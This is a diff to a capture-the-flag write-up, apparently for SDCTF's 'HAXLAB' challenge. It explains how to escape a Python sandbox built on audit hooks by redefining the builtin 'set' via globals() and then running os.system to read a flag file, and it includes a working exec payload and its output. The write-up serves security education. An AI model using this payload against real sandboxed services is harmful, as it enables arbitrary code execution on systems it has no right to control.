@@ -178,11 +178,22 @@ Because we have access to ```globals()['__builtins__']```  we can redefine many 
 This implementation will ignore the argument provided an return a fixed set, with a content we can control. The content includes previous events and then the events we require to call a system command or to open a file. Basically we get full control over the program and can execute any code we want.
 
 Because the objective is to demonstrate arbitrary RCE, our object is to include ```os.system``` and define ```set``` ```as lambda x: ['builtins.input', 'builtins.input/result','exec', 'os.system']```. 
+
 The result is our payload, that will obtain the flag.
-
 ```
->>> exec("globals()['__builtins__']['set']=lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']\nimport os\nos.system('cat flag2.txt')")
-
+exec("globals()['__builtins__']['set']=lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']\nimport os\nos.system('cat flag2.txt')")
 ```
 
-This was solved minutes after the CTF, so the flag was not available to us.
+Lets test it.
+
+
+```
+======= HAXLAB - An advanced yet secure calculator =======
+Powered by Python 3.8.5 (default, Jan 27 2021, 15:41:15)
+[GCC 9.3.0]
+>>> exec("globals()['__builtins__']['set']=lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']\nimport os\nos.system('cat
+flag2.txt')")
+sdctf{4ud1t_hO0ks_aR3_N0T_SaNDB0x35}
+```
+
+This was solved minutes after the CTF :( 
